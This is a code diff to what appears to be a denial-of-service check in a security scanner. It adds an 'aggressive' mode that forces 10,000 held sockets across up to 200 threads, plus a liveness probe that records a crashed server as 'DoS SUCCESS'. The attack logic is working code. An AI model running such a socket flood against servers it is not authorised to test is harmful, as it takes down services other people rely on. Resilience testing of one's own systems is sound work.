@@ -22,8 +22,22 @@ def check(base_url, scenario, logger):
     
     # Massive Scale
     target_socket_count = int(scenario.config.get("sockets", 2000)) 
+    
+    # Aggressive override: If user wants aggressive, we shouldn't be limited by weak config defaults
+    if is_aggressive:
+        # Override to ensure we actually drop the server as requested
+        # 100 is way too low (default in yaml), 2000 is mild. 10000 is a good start.
+        if target_socket_count < 10000:
+             print(f"    [DoS] 🚀 AGGRESSIVE SCALING: Overriding sockets from {target_socket_count} to 10000")
+             target_socket_count = 10000
+
     duration = int(scenario.config.get("duration", 60))
-    thread_count = 10
+    
+    # Optimize Thread Count for fast ramp-up
+    # We want roughly 50-100 sockets per thread max to ensure quick filling
+    thread_count = max(10, target_socket_count // 50) 
+    if thread_count > 200: thread_count = 200 # Cap threads to avoid OS native thread issues
+    
     sockets_per_thread = target_socket_count // thread_count
     
     print(f"    [DoS] Launching {target_socket_count} sockets across {thread_count} threads against {target_ip}:{port}...")
@@ -111,14 +125,28 @@ def check(base_url, scenario, logger):
     connected_peak = stats["connected"]
     dropped_total = stats["dropped"]
     
-    details = f"Peak Connections: {connected_peak}. Dropped by Server: {dropped_total}."
-    
-    # If we maintained high connections with low drops -> Vulnerable
-    # If we had huge drops -> Server is fighting back (or crashing/resetting)
-    # BUT user wants "Server should die". If server died, we would see 'dropped' spike as sockets close.
-    # Actually, if server dies, subsequent connects fail.
-    
-    if connected_peak > (target_socket_count * 0.5):
-         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", f"DoS Choke Successful. {details}")
+    # Liveness Check
+    is_down = False
+    print("    [DoS] Verifying if server is still up...")
+    try:
+        # Simple socket connect check to see if port is open/accepting
+        s_check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s_check.settimeout(3)
+        if parsed.scheme == "https":
+            s_check = ssl.wrap_socket(s_check)
+        s_check.connect((target_ip, port))
+        s_check.send(f"GET {scenario.target} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode("utf-8"))
+        resp = s_check.recv(1024)
+        s_check.close()
+        if not resp: is_down = True
+    except:
+        is_down = True
+        
+    details = f"Peak Connections: {connected_peak}. Dropped: {dropped_total}. Server Down: {is_down}"
+
+    if is_down:
+         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", f"DoS SUCCESS: Server Dropped/Unresponsive. {details}")
+    elif connected_peak > (target_socket_count * 0.5):
+         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"DoS Partial Success (Choke). {details}")
     else:
          return CheckResult(scenario.id, scenario.type, "SECURE", "MEDIUM", f"Server resisted choke. {details}")
